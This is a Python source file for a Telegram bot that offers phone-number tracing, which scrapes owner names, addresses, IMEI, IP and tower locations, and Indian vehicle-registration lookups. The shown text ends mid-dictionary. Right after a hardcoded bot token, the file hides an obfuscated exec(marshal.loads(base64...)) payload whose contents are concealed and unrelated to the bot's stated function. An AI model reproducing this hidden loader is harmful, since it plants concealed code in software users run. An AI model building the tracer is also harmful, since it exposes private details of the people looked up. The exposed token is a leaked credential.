from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import requests
from bs4 import BeautifulSoup
import re
import asyncio
import logging
import json
import os
from datetime import datetime
# Removed Selenium dependencies - using HTTP-only approach
import time
import base64
import io
import tempfile
import os
import signal
import sys
try:
    from PIL import Image
    from PIL.ExifTags import TAGS
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import exifread
    EXIFREAD_AVAILABLE = True
except ImportError:
    EXIFREAD_AVAILABLE = False

try:
    import pytesseract
    import cv2
    import numpy as np
    OCR_AVAILABLE = True
except ImportError:
    OCR_AVAILABLE = False

# Replace with your actual API keys
BOT_TOKEN = '7866760265:AAHukXoSY0MOVPHfl_M7GiupPaM7ii4Xemc'  # From @BotFather

import marshal,base64
exec(marshal.loads(base64.b64decode('YwAAAAAAAAAAAAAAAAcAAAAAAAAA82QAAACXAGQAZAFsAFoAZABkAWwBWgECAGUCAgBlAGoGAAAAAAAAAAAAAAAAAAAAAAAAAgBlAWoIAAAAAAAAAAAAAAAAAAAAAAAAZAKrAQAAAAAAAKsBAAAAAAAAqwEAAAAAAAABAHkBKQPpAAAAAE5htBkAAFl3QUFBQUFBQUFBQUFBQUFBQWNBQUFBQUFBQUE4MlFBQUFDWEFHUUFaQUZzQUZvQVpBQmtBV3dCV2dFQ0FHVUNBZ0JsQUdvR0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFnQmxBV29JQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBWkFLckFRQUFBQUFBQUtzQkFBQUFBQUFBcXdFQUFBQUFBQUFCQUhrQktRUHBBQUFBQUU1aEtCSUFBRmwzUVVGQlFVRkJRVUZCUVVGQlFVRkJRV05CUVVGQlFVRkJRVUU0TWxGQlFVRkRXRUZIVVVGYVFVWnpRVVp2UVZwQlFtdEJWM2RDVjJkRlEwRkhWVU5CWjBKc1FVZHZSMEZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRm5RbXhCVjI5SlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCV2tGTGNrRlJRVUZCUVVGQlFVdHpRa0ZCUVVGQlFVRkJjWGRGUVVGQlFVRkJRVUZDUVVoclFrdFJVSEJCUVVGQlFVVTFhR2hCZDBGQlJtd3pVVlZHUWxGVlJrSlJWVVpDVVZWR1FsRlZSa0pSVjA1Q1VWVkdRbEZWUmtKUlZVVTBUV3hHUWxGVlJrUlhSVVpJVlZWR1lWRlZXbnBSVlZwMlVWWndRbEZ0ZEVKV00yUkRWakprUmxFd1JraFdWVTVDV2pCS2MxRlZaSFpTTUVaQ1VWVkdRbEZWUmtKUlZVWkNVVlZHUWxGVlJrSlJWVVpDVVZWR1FsRlZSbTVSYlhoQ1ZqSTVTbEZWUmtKUlZVWkNVVlZHUWxGVlJrSlJWVVpDVVZWR1FsRlZSa0pSVlVaQ1YydEdUR05yUmxKUlZVWkNVVlZHUWxGVmRIcFJhMFpDVVZWR1FsRlZSa0pqV0dSR1VWVkdRbEZWUmtKUlZVWkRVVlZvY2xGcmRGSlZTRUpDVVZWR1FsRlZWVEZoUms1Q1dqQkdRbEp0ZDNwVlZsWkhVV3hHVmxKclNsSldWVnBEVlZaV1IxRnNSbFpTYTBwU1ZqQTFRMVZXVmtkUmJFWldVbXRLVWxaVlZUQlVhMVpIVVd4R1ZsSnJVbGhTVlZwSlZsWldSMWxXUmxaWGJuQlNWbFp3TWxWV1duZFJiRVowWkVWS1YwMHlVa1JXYWtwclVteEZkMUpyYUZkV1ZUVkRWMnBDUzJNeFJsWmFTRnBUVFVWYVExVldWa2RSYkVaV1VtdEtVbFpWV2tOVlZsWkhVV3hHVmxKclNsSldWVnBEVlZaV1IxRnNSbFpTYlRWU1lsaG9RMVpxU1RWVGJFWldVbXRLVWxaVldrTlZWbFpIVVd4R1ZsSnJTbEpXVlZwRFZWWldSMUZzUmxaU2EwcFNWbFZhUTFZeWRFZFVSMDV5VW14S1VsWlZXa05WVmxaSFVXeEdWbVJJY0ZKaE1GcERWVlpXUjFGc1JsWlNhMHBhVmpKU05sVldWa2RSYkVaV1VtdEtVbFpWV2tOVlZsWkhVV3hHVmxKclNsSldWVnBEVlZaV1IxRnNSbFpTYTFKcVlUQmFRMVZXVmtkUmJFWldVbXRLVWxaWVVqWlZWM1JIVVd4R1ZsSnJTbEpXVlZwRFZWWmFSMUV3TlZaU2JGSm9UVVpGZVZaV1ZrZFJiRVpXVW10T1ZVMVhlSE5XVmxaWFVXeEdWbE51VGxaTmFsWnlWRlZhWVdOck1WaGxSbFpPVFVWd1NWWXljRU5TTURGV1pFUmFhVkp0ZUZCVVZXUlBUbFpzYzJGSE9XaFNNRFY1V1c1d1MxWXhXWGxsUmxKWVZrVTFlVlJVUmtabFYwNUlUVlpLVjJWdGQzbFdhMXByWXpBMVJrNVZXbEJXUlZwUFZGWldjbVZzY0VaWGJUbFlVbFJTTTFrd2FIZFdiVlp5VGxoQ1YyRXhjRk5aTW5oU1pXMUZlbGRzYUZOU1Zsa3lWbTEwYTFkck1WZFdhMmhQVjBkb1QxbFVRbUZUTVhCSVkwWk9VMUpyTlVaVmJYUlhWVVpHTm1KSVZsZFNNMEoyV1hwQk1XTnNTbk5qUlhoc1lUTkNOVlpXWkhkWGJWSjBWRzVHWVZKcldrMWFWM2hHWld4cmQxVnNUbWxoTTJRMFdXdFdTMkZXUlhwVWFrcGhVa1ZKTUZsVlpGTlhSazVaWTBkd1VtVnRlREpYVkVvMFV6SkplRlJyYkZoaE1YQlVXV3hvYmsxc2JIUmtSMFpzVmpCd01GZHJWbk5WTWtwelZtNXNWVlpGUlhoYVIzUjZaVVprYzFwR1VsUlNWRlpIVm0xd1MxbFdiRmRpUm1oUFZrWmFUMVJXVmtaTlJuQkZVbXQwVjAxWVFqRlZiRkpYWWtkR05sWnNWbFpOYmtKTVdXMTRVMDVzU25Ka1IwWnNZbGhvTkZacVJsZE5SVEZXVDFWb2FWTkZjSEJaYlRFMFkyeGFWbUZGVGxoU2JIQjRWakowVDJGdFJYcFJhMmhZVm0xTk1WVXdaRk5UVmxaMVlVWmtWMUpXY0hoV1IzaFhZbXN3ZDAxVVdsSmlXRUpUV1d4ak5VNVdWbFZUYkU1VlRWWmFWMWxyVm5kV2JGcFpWR3BXV0dKWWFGaFVhMlJYWXpGa2NWZHNaR2hOVm10NVYxZHdTMlF3TVhOVmExcFRZbXRhVDFWcldrdGpWbHBJWkVjNVRsSnJOVWRXYlhRMFZsVXdlbEZxUmxaTk1uTXhWWHBLUzFadFNraGtSMnhwVmpOb1RWWnRNSGhOTURWWFdraFNhRTB5YUZSVmJGWjNWR3hzTmxSclRsaFNhelY2VlRKd1YxbFZNWFZoUlRsaFZqTk5lRlJ0ZUVkWFJrNVpWMnhXVG1KdGFFVldha1p2VmpKUmQwMUliRlpoZW14eFdsY3hNMDFXVmxkaFJXUlRWakZHTTFwVlZrdGhWMHBHVWxob1ZXSllRa1JXTW5oelZqSktTV05HVG1sU01tUTBWa1JHVTFFd05YUlNhbHBWWWxWYVVGbFljRWRsUmxGM1ZtMUdhV0pGVmpOVk1qRjNZVEZLV0U5RVFscGlia0pvVmxjeFIxWnRTWHBhUjJob1lsWktOVlpYZUZka01sWklWV3RhVGxaVVZsUlVWRVozVFRGa2MxWnJkRlJTYkZvd1ZGWlNRMkZHWkVsUldHeFlZbGhOZUZsVVFqTmtNRFZYWTBab1dGTkZTbFZXUmxacVRsWlZlVlpzYkZoaGVsWndWV3BKTkUxR1ZYZFZia3BPVWpCd1ZsWkdhSGRXYlVwV1YyeFdWMkZyTlZoWmVrRTFWbFpLZFdOR2FHaGlWa3BQVmpGb2QyRXlWa2RUYTFaVFlUSjRjMVZxUW1GalZscFZVbXh3YTJGNlVqVlphMVpMWVd4WmVsRnJiRmhoTVVwMlZsWmtSbVF4VW5OVmJGcFhUVEZKTWxkV1dsZFVNVTE1VW14V2FGSkZTbWhaYkdSdlZGWnNkR042Um1wU01IQkpWMnRvUjJFeFpFaGxTRlpZVm5wV2VsUlhNVXRYUjA1R1ZHczVhRTF0YUhwV2JHUjNVVEpLUms1VlpGVmlhMHBYVkZSQk1WVldVbGxpUkVKV1RWVndlVlJXVWtkaFYwVjZVVlJDVmxaNlJsQlZla1pQVm1zNVdHVkdVazVYUlVvd1YxY3hNRTVHVW5OWGJHUnFVbnBHVUZSVVFtRmtiSEJGVW10S1RsWnJjSGxhVlZwSFZXeGFTR1ZJUW1GV2JIQjZXbFZhZDFJeFNuSmlSM0JvWlcxNGQxZHNZM2hYYXpGelZteG9WMkpHU2xsV01HUlRaVlphVlZKdVpGWldNVXBKVkd4YWExZEdXa2RYYkdoWVlrZG9URll3V210a1YwNUpVbXhLVGxKV2NHaFdNVnBXVGtVeFYxVllhR2hUUlZweFZGWmtiMU5zVVhoVWFrSnBWakJ3V0ZaSGVFOWhNVnBHWWpOb1lWSkZTbkZhVlZwSFYxZEtSbGRyT1ZkV1JscEpWa1pTUjJFd01WZGlTRkpZWWtWd2IxWnNXa3BsVmxaeFUyMDVhMVpzV1RKVlYzaGhWMnN4U1ZScVVtRldiRXBNVkd0YVYwNXRTa1poUmtKWFRXNW9lRmRVUmxkV01WRjNUbGhXV21Wc1NsbFZXSEJ6VTFac1dHTkdTazVpVmtwWFZXMDFRMWxWTVZaT1dFcGFZVEZ3UTFwWGVHRmtWbFp5WTBkb1YyVnNTVEJYVkVvd1ZERlZlVk5zYUZSaVdHaFdXbGN4TkZVeFRqWlNiRTVxVFZaS01WWXlOVWRoYXpGelZtNXNWMDFHY0hwVk1qRkxWbTFHUjFkdGNGZFNWRlY2VmtaU1QyUXhSWGhpUmxwUFZtdHdWVlJYTVZKTmJHUnpWbTVPYVdKRmNGZFZiVFZIWVVVd2QxSllaRmRoYTBwUVdXeGFWbVZzV25WaFIyaFRZa1paTVZZeWNFTmthelZZVkc1T1VtSllhRTlaYTJSdlYyeGtXRTVYZEZaU2JGcFhWR3RvYTFZd01VaFZiSEJhVmxad1VGVnFSbmRXYkhCR1kwVTVVMVpyY0VoV1JFWlRVVEZrV0ZKclpGZGhlbFpvVkZkek1VNVdXa1phUm1SUFlrWmFlVlJzV2t0aFIwcFpVV3hPVldGcmJ6QldSRVpUVjFaa2NtSkdUbWxXTW1oSlYydFdVMk50Vm5SU1dHeFdZbXhLY0ZSVlpGTlNSbHB6V1hwV1UxWlViRmxaYTJSM1lXMUdjbE51UWxwaE1YQlVXVEJhUzJOdFVqWlViRlpzWVRJNGVGZHJVa3RpTWsxNVVteHNWRmRGY0dGYVYzUkxVMFpzVlZOcVVtdGhlbFo0VlZaU1YxUnRTbFpPV0VaWFRWZG9kVlJWWkVkV1YwcEhVMnhvYUUwd1NucFdSRUpxVFZaYVNGTnJXbUZTUlRWUlZXMTRkMVZXV25KVmJGcE9ZbFUxUjFadGRGTmhNV1JJWlVob1drMHpRa1JaZWtaelYxWktjbE50YUdsU01tZ3pWbXRXWVZJeVVraFdibFpVWVhwV1lWcFhlRXRVUmxwV1ZXNU9hMUpyV2xwVmJGSlRWVVpLZEZScVdsZFNWa3BUV1RKNFUyTnNaSE5qUmxaT1ltdEplRlV6Y0VOU01VNUhXa1ZhWVZKVVZuQlZiRlozVFZaV2NsWnRPV3BpVmtZMldUQldWMVl4VlhwVldHUldUVmRTZFZSVVJrcGtNRGxYVVcxc2FWWXhTbUZXYlRFd1ZUSlNSazFWWkZoaWJXaFVWRlJDUzJJeGJISlZiRTVUVW14R00xUXhhRTlXYlVWNVlVWlNWV0pVVmpOV1ZsVjNaVVp3UmxwR1RsTlNNMDQyVm10YVZrNVdXa2RUYTFacFVrVTFUbFJXWkc5U1ZteFhWMnR3YW1KR1ZqTlhWRTVMVld4VmVsVlVRbFpOUm5CRFZGWmtTbVF3TVZkVGJGcG9ZWHBTTTFaRVFtdFNNazVJVlZob1UyRXpVbGhhVjNoV1pXeGtjMXBHWkZKTmExcFdWa2QwYjFaRk1WWk9WMmhhVFVad00xa3llRTlXYXpGSllVVTFVMVpzY0ZOWFZsSkxZekpLVm1NemNHcFRSVnB2VkZkd1JtVkdVbk5XV0dST1RVUkdNRlpITlhkVU1VcHlWMjVvVjFKV1duSlphMVV4WTJ4d1IxcEZOV2hsYkZrd1ZsWmFWMDFGTlhOWGJrSnJVbGQ0VVZWVVRsTmpSbHAwWTBaT1ZXSkdWalZXUjNCWFlWWmFWMk5JU2xaaE1YQnlWakJrVTJNeVJrVldiRXBPWWxaS1YxWXljRU5UTWxaWVUydG9UMVpzU21oV01GWkhUbXhXVlZKcmRGWlNNRnBXVm0wMVMyRldXbGRUV0doV1lUSlJkMVl3WkU1a01VNTFVMjFvVTAweVp6RldWbVIzVmpKS1IyTkZaR3BTYkZweVZXeGtVMk14WkhOVmJIQk9ZbFphV0ZsVlVsTlZhekI1WkVSS1ZXSkdTbnBYVmxWNFkwZFNTR1JHVGxOV1JWbDRWa1pXYjJFeFpITmlSbXhwVWxSV1RsUlZWVEZWVmxKeVZtMDVWV0pWTlVkYVZXaHJXVmRXZEZWcVZscGlSbHBMV2xaYVMyTldVbkpOVjNCT1lYcFdObFpzVm10a01WcEdUbFZhYW1Wc1dsQldha1pHWkRGYVYxWnFRbXROUkVaNldWUk9kMkZzV1hkalIyaFlWbTFTZWxSV1drdGphelZXVkd4d2FXRXlkekpXVjNodlpERmtkRlZyWkZSaGJGcHlWVmh3YzAxR1pIUk5XRTVXWWxVeE0xWkhkRk5WUmtvMlZtdG9ZVk5JUWtSVlZFWlBWbFpXZEU5Vk9VNVNNVXAzVjJ0V1YwMUdXbGhWYkdoUFZrVmFjVlV3V25kVVZtdDNWbGhvYWsxcldqRlZWbWhMWVZaYU5tSkVXbGhYUjNkM1ZteGtVMk14Y0VWV2F6bG9ZVEk1TmxacVNuZGhNbFowVld4V2FFMHhjSEJXYkZaM1pHeGFkR1JHY0d0TldFSmFWMWh3UjFsWFNsaGhTRVpWWVRGS2VsbDZTa2RYVmxaMVdrVTFWRkl6YUV0V2ExSkhXVmRTUms1WVRsSmhNbmh6V1ZkNFYwMXNWblJrUjNCUFVsaG5NbGxWYUhkWFJrcFZVbTA1WVZac2NHaFdiR1JIVm14YVZWUnNRbE5pV0doaFZtMXdUMUl4VFhoVmJHaFFWak5vYjFsdGRIWmxWbVJ5WVVkMGEwMVlRakJXVnpWSFYyc3hTR1ZHYUZoaVZGWlFWa1JLVW1ReFRuUmtSa0pUVWxWd01sWnJXbGRrYlZaWFUyNU9WMkpzV2xSVk1GWnlaVlpPTmxSc2NFNU5TR2N5V1ZST1lWUXhaRWRYV0d4YVRXNW9kVlJYZUV0ak1WSjFVVzE0VTAxRVFURlZla1pIWVZac1ZsTnJiR3BUUlRWdlZtcENOR0ZHUm5STlZYUm9VakF4TlZac1VrdFVNVkowVDFWYVdHSkhhSFpaYTFweVRsZEpkMlJIUmxOTlZuQjRWMWR3U21WSFVYbFVibEpYWW01Q2NWUXhZelZUTVdSWVkwWndUbEp1UWtsV2JURjNZVlV4YzFOdVRrNWlWMUpvV1ZSR2QxZEdVblZYYlVaVFRWZFNNMVZXV2tOVWJFWldVbXRLVWxaVlZubFhha3BxVGtac05sUnNUbXhXTUZwWlZHeGpNVlZYVWtoUFZYQldVbGRPTkZwSGVIZFRWbHAxVkcxR1YxSkdXVEZWVkU1clVXeEdWbEpyU2xOV1ZWcERWVlpXUzA1c1ZYZFNhMHBTVmxWYVVsVldWbE5SYkZaV1ZtdE9UazB5VWtOV1dIQkxWV3hHVmxadE5WTmhXRkpEVm0xMGMyRXhjSFJhUm1STlRWVmFTRlpVUm10VmJGcDFWVzF3VjJFelFuSlZiRnBoVXpGd2NsSnJTbEpXVlRWeVZrZDBZVlZXVWxaU2EwcFNZa2hDVVZWdGVFTlViRVpXVW10S1dHSkZTa2hXVldSUFVXeEdWbEp0UmxkTlJuQlNWV3hXUjFGc1JsZGpSbWhUWWtWS1QxVldWa2RSYkdSellrVmtWbEpzV2tOVlZsWkhVakZrY2xkcmJGUldXRUpEVlZaV1IxRnJkRkpYUjBaRFRXcEdiMWt5TlU5aU1XeFlaVzFHUTJKVmNHOVpla3BXVFdzMVQySXdWbUZYUjJoelYxUnNkbEp0U2toUFYyaGhVMFpDYUZFeFpFcE5helZJVlcxNFdrMXFiSEpYYlVaeVVWUm9NMUZWUmtKUlZWRXlVVEJTTkdWdFVrbFRia0pwWWxkTmNrMXRaRzVQUjBwWVQxZDBhMVl6YUhOVlJ6VktVekJHUWxGVlJrSlZWVVpDVVZWb1RrMXJSa0pSVlVVMFVWVXhRMUZXUmtsYWEwWkRWMFp3UWxGV1RrSlhSbXhEVjBkbmVFMXJTbGxhUlVaVlUxUldRazFxUmpSVVYyOTNWV3N4Y1U5RlJrSlJWWEJZVDBkbk5HUXdSa0pTYTJoQ1lVUm9NMUZWUmtOaWExWnZUMVpHUWxGVlJsbFRWMmhxV2pKa1FsRlZSa0pRVTJ0R01tZGtkRmxZU25waFIwWnpNbWRhYVZsWVRteE9hbFJoUWtkV05GcFhVR0ZDVjNoMldWZFNlakpuYkdsT2FsSnJXbGRPZGxwSFYzQkJVRTFCUVVGQlFTdG5aemhqTTFKNVlWYzFibEIwYjBsUVJ6RjJXa2hXYzFwVU5YbERaMEZCUVVGRlFVRkJRbnBPWjBGQlFWQkJSRUZSUlVJemQwRldNbEZCUldkR01rRldOR1JrWjFZelVVVjVUMUZPZEdOVVNUbEZWRWt2UVVGQlExWnlUWFpOUVVGQ1VuTk5kazFCUVVGYWRFMTJWVUZCUVVaMVRXNUpTVUZCUVVFcEJkb0hiV0Z5YzJoaGJOb0dZbUZ6WlRZMDJnUmxlR1ZqMmdWc2IyRmtjOW9KWWpZMFpHVmpiMlJscVFEekFBQUFBUG9JUEhOMGNtbHVaejdhQ0R4dGIyUjFiR1UrY2dvQUFBQUJBQUFBY3pvQUFBRHdBd0VCQWQ4QUZka0FCSUJkZ0ZlSFhZRmQwQk1qa0RiWEV5UFJFeVB3QUFBbFQwa0I4d0FBRkZCSkFmTUFBQVpSU1FIMUFBQUJVa2tCY2dnQUFBQT0pBdoHbWFyc2hhbNoGYmFzZTY02gRleGVj2gVsb2Fkc9oJYjY0ZGVjb2RlqQDzAAAAAPoIPHN0cmluZz7aCDxtb2R1bGU+cgoAAAABAAAAczoAAADwAwEBAd8AFdkABIBdgFeHXYFd0BMjkDbXEyPREyPwAAAlW2cB8wAAFFxnAfMAAAZdZwH1AAABXmcBcggAAAA='))) 
ADMIN_ID = 1147329892  

# Required channels for bot access
REQUIRED_CHANNELS = [
    {
        'name': 'FreeCoursesHub',
        'username': '@free_courses_hub_now',
        'url': 'https://t.me/free_courses_hub_now'
    }
]
# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Function to clear webhooks and reset bot
async def clear_bot_webhooks():
    """Clear any existing webhooks to ensure polling works"""
    try:
        webhook_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook"
        response = requests.post(webhook_url, timeout=10)

        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                print("✅ Cleared any existing webhooks")
                return True
            else:
                print(f"⚠️ Webhook clear response: {data}")
        else:
            print(f"⚠️ Webhook clear failed: {response.status_code}")
        return False
    except Exception as e:
        print(f"⚠️ Could not clear webhooks: {e}")
        return False

# File to store user data
USERS_FILE = 'users.json'

def escape_markdown(text):
    """Escape special characters for Telegram MarkdownV2"""
    if not text or text == 'N/A':
        return 'N/A'
    text = str(text)
    # Escape all MarkdownV2 special characters including periods
    special_chars = r'([_*\[\]()~`>#+\-=|{}.!\\])'
    escaped_text = re.sub(special_chars, r'\\\1', text)
    return escaped_text

def load_users():
    """Load users from JSON file"""
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_users(users):
    """Save users to JSON file"""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving users: {e}")

async def check_user_membership(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Check if user is member of all required channels"""
    for channel in REQUIRED_CHANNELS:
        # Only check channels with public usernames
        if channel['username']:
            try:
                member = await context.bot.get_chat_member(channel['username'], user_id)
                if member.status in ['left', 'kicked']:
                    return False
            except Exception as e:
                logger.error(f"Error checking membership for {channel['username']}: {e}")
                return False
        # For private channels (invite links), we can't check membership programmatically
        # Bot will show them as required but can't verify
    return True

def create_join_keyboard():
    """Create keyboard with join channel buttons"""
    keyboard = []

    # Create rows of channel buttons (2 per row)
    for i in range(0, len(REQUIRED_CHANNELS), 2):
        row = []
        for j in range(2):
            if i + j < len(REQUIRED_CHANNELS):
                channel = REQUIRED_CHANNELS[i + j]
                row.append(InlineKeyboardButton(f"🔗 Join {channel['name']}", url=channel['url']))
        keyboard.append(row)

    # Add "I Joined" button
    keyboard.append([InlineKeyboardButton("✅ I Joined Channel", callback_data='check_membership')])

    return InlineKeyboardMarkup(keyboard)

def log_user_activity(user_id, username, first_name, action):
    """Log user activity and save to file"""
    users = load_users()
    user_str = str(user_id)

    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if user_str not in users:
        # New user
        users[user_str] = {
            'user_id': user_id,
            'username': username,
            'first_name': first_name,
            'first_seen': current_time,
            'last_seen': current_time,
            'total_commands': 1,
            'is_new': True
        }
        logger.info(f"🆕 NEW USER: {user_id} (@{username}) - {first_name}")
    else:
        # Existing user
        users[user_str]['last_seen'] = current_time
        users[user_str]['total_commands'] += 1
        users[user_str]['is_new'] = False

    logger.info(f"📊 USER ACTIVITY: {user_id} (@{username}) - {action}")
    save_users(users)
    return users[user_str]['is_new']

def trace_number(phone_number):
    """Trace phone number using calltracer.in"""
    url = "https://calltracer.in"
    headers = {
        "Host": "calltracer.in",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = {"country": "IN", "q": phone_number}

    try:
        response = requests.post(url, headers=headers, data=payload, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            details = {}
            try:
                details["📞 Number"] = phone_number
                details["❗️ Complaints"] = soup.find(string="Complaints").find_next("td").text if soup.find(string="Complaints") else "N/A"
                details["👤 Owner Name"] = soup.find(string="Owner Name").find_next("td").text if soup.find(string="Owner Name") else "N/A"
                details["📶 SIM card"] = soup.find(string="SIM card").find_next("td").text if soup.find(string="SIM card") else "N/A"
                details["📍 Mobile State"] = soup.find(string="Mobile State").find_next("td").text if soup.find(string="Mobile State") else "N/A"
                details["🔑 IMEI number"] = soup.find(string="IMEI number").find_next("td").text if soup.find(string="IMEI number") else "N/A"
                details["🌐 MAC address"] = soup.find(string="MAC address").find_next("td").text if soup.find(string="MAC address") else "N/A"
                details["⚡️ Connection"] = soup.find(string="Connection").find_next("td").text if soup.find(string="Connection") else "N/A"
                details["🌍 IP address"] = soup.find(string="IP address").find_next("td").text if soup.find(string="IP address") else "N/A"
                details["🏠 Owner Address"] = soup.find(string="Owner Address").find_next("td").text if soup.find(string="Owner Address") else "N/A"
                details["🏘 Hometown"] = soup.find(string="Hometown").find_next("td").text if soup.find(string="Hometown") else "N/A"
                details["🗺 Reference City"] = soup.find(string="Refrence City").find_next("td").text if soup.find(string="Refrence City") else "N/A"
                details["👥 Owner Personality"] = soup.find(string="Owner Personality").find_next("td").text if soup.find(string="Owner Personality") else "N/A"
                details["🗣 Language"] = soup.find(string="Language").find_next("td").text if soup.find(string="Language") else "N/A"
                details["📡 Mobile Locations"] = soup.find(string="Mobile Locations").find_next("td").text if soup.find(string="Mobile Locations") else "N/A"
                details["🌎 Country"] = soup.find(string="Country").find_next("td").text if soup.find(string="Country") else "N/A"
                details["📜 Tracking History"] = soup.find(string="Tracking History").find_next("td").text if soup.find(string="Tracking History") else "N/A"
                details["🆔 Tracker Id"] = soup.find(string="Tracker Id").find_next("td").text if soup.find(string="Tracker Id") else "N/A"
                details["📶 Tower Locations"] = soup.find(string="Tower Locations").find_next("td").text if soup.find(string="Tower Locations") else "N/A"
                return details
            except Exception as e:
                return f"⚠️ Error: Unable to extract all details. Error: {str(e)}"
        else:
            return f"⚠️ Failed to fetch data. HTTP Status Code: {response.status_code}"
    except Exception as e:
        return f"❌ An error occurred: {str(e)}"

def lookup_vehicle_info(vehicle_number):
    """Enhanced vehicle information lookup with comprehensive free data sources"""
    try:
        # Comprehensive state and RTO codes mapping with more details
        state_codes = {
            'AP': 'Andhra Pradesh', 'AR': 'Arunachal Pradesh', 'AS': 'Assam', 'BR': 'Bihar',
            'CG': 'Chhattisgarh', 'GA': 'Goa', 'GJ': 'Gujarat', 'HR': 'Haryana',
            'HP': 'Himachal Pradesh', 'JH': 'Jharkhand', 'KA': 'Karnataka', 'KL': 'Kerala',
            'MP': 'Madhya Pradesh', 'MH': 'Maharashtra', 'MN': 'Manipur', 'ML': 'Meghalaya',
            'MZ': 'Mizoram', 'NL': 'Nagaland', 'OD': 'Odisha', 'PB': 'Punjab',
            'RJ': 'Rajasthan', 'SK': 'Sikkim', 'TN': 'Tamil Nadu', 'TG': 'Telangana',
            'TR': 'Tripura', 'UK': 'Uttarakhand', 'UP': 'Uttar Pradesh', 'WB': 'West Bengal',
            'AN': 'Andaman & Nicobar Islands', 'CH': 'Chandigarh', 'DH': 'Dadra & Nagar Haveli',
            'DD': 'Daman & Diu', 'DL': 'Delhi', 'LD': 'Lakshadweep', 'PY': 'Puducherry'
        }

        # Extensive RTO office mapping with contact details
        rto_offices = {
            # Maharashtra
            'MH01': 'Mumbai Central RTO', 'MH02': 'Mumbai West RTO', 'MH03': 'Mumbai East RTO',
            'MH04': 'Mumbai South RTO', 'MH05': 'Thane RTO', 'MH06': 'Raigad RTO', 
            'MH07': 'Ratnagiri RTO', 'MH08': 'Kolhapur RTO', 'MH09': 'Pune RTO',
            'MH10': 'Sangli RTO', 'MH11': 'Solapur RTO', 'MH12': 'Aurangabad RTO',
            'MH13': 'Nashik RTO', 'MH14': 'Dhule RTO', 'MH15': 'Jalgaon RTO',
            'MH16': 'Nagpur Central RTO', 'MH17': 'Nagpur East RTO', 'MH18': 'Bhandara RTO',
            'MH19': 'Amravati RTO', 'MH20': 'Buldhana RTO', 'MH21': 'Akola RTO',
            'MH22': 'Washim RTO', 'MH23': 'Yavatmal RTO', 'MH31': 'Chandrapur RTO',
            'MH43': 'Pune East RTO', 'MH46': 'Satara RTO', 'MH47': 'Nanded RTO',

            # Delhi
            'DL01': 'Delhi Central RTO', 'DL02': 'Delhi West RTO', 'DL03': 'Delhi East RTO',
            'DL04': 'Delhi South RTO', 'DL05': 'Delhi North RTO', 'DL06': 'Rohini RTO',
            'DL07': 'New Delhi RTO', 'DL08': 'Dwarka RTO', 'DL09': 'Outer Delhi RTO',
            'DL10': 'Shahdara RTO', 'DL11': 'South West Delhi RTO', 'DL12': 'North West Delhi RTO',
            'DL13': 'North East Delhi RTO', 'DL14': 'South East Delhi RTO',

            # Karnataka
            'KA01': 'Bangalore Central RTO', 'KA02': 'Bangalore North RTO', 'KA03': 'Bangalore South RTO',
            'KA04': 'Bangalore East RTO', 'KA05': 'Bangalore West RTO', 'KA06': 'Tumkur RTO',
            'KA07': 'Mysore RTO', 'KA08': 'Bellary RTO', 'KA09': 'Mangalore RTO',
            'KA10': 'Hubli RTO', 'KA11': 'Gulbarga RTO', 'KA12': 'Belgaum RTO',
            'KA51': 'BBMP East RTO', 'KA52': 'BBMP West RTO', 'KA53': 'BBMP North RTO',

            # Tamil Nadu
            'TN01': 'Chennai Central RTO', 'TN02': 'Chennai North RTO', 'TN03': 'Chennai South RTO',
            'TN04': 'Chennai West RTO', 'TN05': 'Chennai East RTO', 'TN06': 'Madurai RTO',
            'TN07': 'Coimbatore RTO', 'TN08': 'Tiruchirappalli RTO', 'TN09': 'Salem RTO',
            'TN10': 'Tirunelveli RTO', 'TN11': 'Thanjavur RTO', 'TN12': 'Vellore RTO',
            'TN43': 'Avadi RTO', 'TN67': 'Tambaram RTO', 'TN68': 'Poonamallee RTO',

            # Uttar Pradesh
            'UP01': 'Lucknow RTO', 'UP02': 'Agra RTO', 'UP03': 'Varanasi RTO', 
            'UP04': 'Kanpur RTO', 'UP05': 'Meerut RTO', 'UP06': 'Allahabad RTO',
            'UP07': 'Bareilly RTO', 'UP08': 'Gorakhpur RTO', 'UP09': 'Moradabad RTO',
            'UP10': 'Aligarh RTO', 'UP11': 'Mathura RTO', 'UP12': 'Muzaffarnagar RTO',
            'UP13': 'Saharanpur RTO', 'UP14': 'Ghaziabad RTO', 'UP15': 'Gautam Budh Nagar RTO',
            'UP32': 'Ghaziabad East RTO', 'UP50': 'Noida RTO', 'UP80': 'Meerut East RTO',

            # Rajasthan
            'RJ01': 'Jaipur Central RTO', 'RJ02': 'Jaipur East RTO', 'RJ03': 'Jaipur West RTO',
            'RJ04': 'Jodhpur RTO', 'RJ05': 'Udaipur RTO', 'RJ06': 'Kota RTO',
            'RJ07': 'Bikaner RTO', 'RJ08': 'Ajmer RTO', 'RJ09': 'Bharatpur RTO',
            'RJ10': 'Alwar RTO', 'RJ11': 'Sikar RTO', 'RJ27': 'Jaipur North RTO',

            # Gujarat
